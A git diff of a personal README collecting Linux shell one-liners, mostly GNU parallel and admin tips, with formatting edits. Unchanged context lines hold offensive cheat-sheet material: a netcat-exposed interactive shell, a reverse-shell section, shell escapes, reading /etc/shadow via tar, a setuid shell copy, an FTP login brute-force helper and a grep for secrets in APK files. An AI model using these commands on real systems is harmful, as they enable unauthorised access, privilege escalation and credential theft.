@@ -16,7 +16,8 @@ All scripts are created by me personally (I will be clear with who the creator i
 
 Thank you for showing your respect and being honest, I'm passionate about freedom and freedom of speech! 
 
-🐧  GNU/Linux/Pipes/Authors - Power 🐧 
+`GNU/Linux/Pipes/Authors` 
+
 ***
 
 My Hardware used in previews:
@@ -24,7 +25,7 @@ My Hardware used in previews:
 ```sh
 Internet : 10000Mbit.se(Telia)
 CPU Model: Intel(R) Xeon(R) CPU E5-2680 v3 @ 2.50GHz
-CPU Cores: printf '%s' $(nproc) = 48
+CPU Cores: `printf '%s' $(nproc)` = 48
 ```
 
 Atm I use  $((nproc + 1)) for the best perfomance, for threads I trying to use $((nproc + 1)) x 2 for best perfomance. 
@@ -34,13 +35,24 @@ export NUMCPUS=$(nproc)
 export NUMCPUSPLUSONE=$(( NUMCPUS + 1 ))
 export NUMTHREADS=$(( NUMCPUSPLUSONE + NUMCPUS ))
 ```
+
 And then: 
 
 ```sh
 parallel -j${NUMCPUSPLUSONE} -n${NUMTHREADS} ....
 ```
 
-If someone has another awesome suggestion how to speed up things, please let me know :) 
+### Clone starred github repos in parallel with unlimited speed, clone 20 repos in parallel.
+
+[Also shared here](https://www.commandlinefu.com/commands/view/26591/clone-starred-github-repos-in-parallel-with-unlimited-speed-this-example-will-clone-25-repositories-in-parallel-at-same-time.)
+
+```sh
+GITUSER=$(whoami); 
+curl "https://api.github.com/users/${GITUSER}/starred?per_page=1000" \
+    |grep -o 'git@[^"]*' \
+    |parallel -j 25 'git clone {}'
+```
+
 
 ### Really fast portscanner with colorized output:
 
@@ -49,7 +61,7 @@ If someone has another awesome suggestion how to speed up things, please let me 
 ![portscan](https://user-images.githubusercontent.com/26827453/177014274-d1fda5b4-83a5-4a7b-9bfe-17784ffb5ee7.gif)
 
 ```sh
-time seq 65535 | \
+seq 65535 | \
 	parallel \
         -k --joblog portscan \
 	-j9 \
@@ -75,7 +87,6 @@ okMSG() {
 errMSG() {
     echo -e "[\e[1;31m*\e[0m] $*"
 }
-
 
 1() {
     curl ftp://host:port -u $line &> /dev/null
@@ -156,11 +167,13 @@ fuser -k 445/tcp
 ```
 
 ### Broadcast your shell thru port 5000
+
 ```sh
 bash -i 2>&1 | tee /dev/stderr | nc -l 5000
 ```
 
 ### You can use the following trick to easy navigate and select paths
+
 ```sh
 mkdir fooPath && cd $_
 ```
@@ -234,7 +247,6 @@ echo $PATH
 echo -e "URL Title: $(curl -s $1|grep -i title|cut -d'<' -f2|cut -d'>' -f2)"
 ```
 
-
 ### Create a UEFI bootable usb:
 
 ```sh
@@ -256,19 +268,6 @@ efibootmgr -d /dev/sda -p 2 -c -L "Gentoo Linux" -l /vmlinuz-5.4.97-gentoo-x86_6
 
 ```sh
 NUM="10";time seq ${NUM}|time xargs -I % -n1 -P${NUM} curl -sL ifconfig.co
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-xx.xxx.xxx.xx
-real 0m0.028s
-user 0m0.012s
-sys  0m0.010s
 ```
      
 ### Print CPU usage 
@@ -384,7 +383,6 @@ now=$(date -u +%s)
 date -u -d "2014-01-01 $now sec - $then sec" +"%j days %H hours %M minutes and %S seconds"
 ```
 
-
 ### Convert a magnet url to a torrent file
 
 ```sh
@@ -408,6 +406,7 @@ fi
 ```
 
 ### How I grab valuable stuff from apk files (extracted)
+
 ```sh
 grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password\
 |pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager \
@@ -426,6 +425,7 @@ cat /sys/class/thermal/thermal_zone*/temp
 ```sh
 find . -maxdepth 1 -iname "*.jpg" | xargs -L1 -I{} convert -resize 50% "{}" _half/"{}"
 ```
+
 ### Find IOMMU groups
 
 ```sh
@@ -465,6 +465,7 @@ seq 4 | parallel -n0 -j2 "curl -H 'Content-Type: application/json' \
 seq 1 | parallel -n0 curl \
 	"http --ignore-stdin POST https://ifconfig.co url=https://google.com/"
 ```
+
 ### Continue until forever until we press ctrl+c (100x)
 
 ```sh
@@ -518,6 +519,7 @@ for i in {1..254}; do
 	arp -d 192.168.0.$i; 
 done
 ```
+
 ### Preserve your fingers from cd ..; cd ..; cd..; cd..;
 ```sh
 up() { 
@@ -560,7 +562,7 @@ END_SCRIPT
 exit 0
 ```
 
-### Can also be done over PHP
+### This can also be done over PHP
 
 ```php
 <?php echo shell_exec("echo open 192.168.42.102 21>/usr/local/databases/ftp.txt");?>
@@ -573,18 +575,20 @@ exit 0
 ```
 
 ### Escaping Shells 
+
 ```sh
 echo FREEDOM! && cd () bash && cd
 ```
 
 ### TAR can read all files, so you can create a tar with a wanted file and than extract it
+
 ```sh
 tar -cvf shadow.tar "/etc/shadow"
 tar -xvf shadow.tar
 cat etc/shadow
 ```
 
-### Netcat without -e
+### Netcat without `-e`
 
 A lot of machines have netcat installed (example macosx) but it's not usable for reverse shells. However, with this it becomes useable.
 
@@ -603,6 +607,7 @@ export TERM=linux
 ```
 
 #### Bash
+
 ```sh
 #### Bash
 echo os.system('/bin/bash')
@@ -611,6 +616,7 @@ exec "/bin/sh";
 ```
 
 #### Perl
+
 ```sh
 perl —e 'exec "/bin/sh";'
 ```
@@ -628,6 +634,7 @@ install -mode 4755 /bin/dash /tmp/sh
 https://cheatsheet.haax.fr/linux-systems/privilege-escalation/abusing_sudo_rights/
 
 ### Exploitable when a user have the following permissions (sudo -l)
+
 ```sh
 (ALL, !root) ALL
 ```
